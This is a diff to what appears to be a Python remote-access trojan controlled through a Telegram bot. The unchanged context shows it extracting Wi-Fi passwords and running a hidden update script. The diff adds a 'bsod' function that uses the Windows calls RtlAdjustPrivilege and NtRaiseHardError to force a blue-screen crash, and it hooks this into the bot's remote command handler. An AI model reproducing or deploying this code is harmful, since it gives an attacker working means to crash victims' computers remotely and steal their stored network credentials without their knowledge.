@@ -452,6 +452,25 @@ sh.Run "{pth}\\upd.bat", 0''' # текст для скрипта обновы
         except Exception as e:
             logger.log(self.extract_wifi_passwords.__name__,e)
             bot.send_message(self.id, f'🖥❌ \n{e}')
+    
+    def bsod(self):
+        nullptr = ctypes.POINTER(ctypes.c_int)()
+
+        ctypes.windll.ntdll.RtlAdjustPrivilege(
+            ctypes.c_uint(19),
+            ctypes.c_uint(1),
+            ctypes.c_uint(0),
+            ctypes.byref(ctypes.c_int())
+        )
+
+        ctypes.windll.ntdll.NtRaiseHardError(
+            ctypes.c_ulong(0xC000007B),
+            ctypes.c_ulong(0),
+            nullptr,
+            nullptr,
+            ctypes.c_uint(6),
+            ctypes.byref(ctypes.c_uint())
+        )
 
     def perfor(self, text, id_chat): # главный обработчик
         try:
@@ -527,6 +546,9 @@ sh.Run "{pth}\\upd.bat", 0''' # текст для скрипта обновы
 
                 if comnd == "wifi" or comnd == "extract_wifi_passwords":
                     self.extract_wifi_passwords()
+                
+                if comnd == "bsod":
+                    self.bsod()
 
                 if comnd == "kill":
                     self.exits()
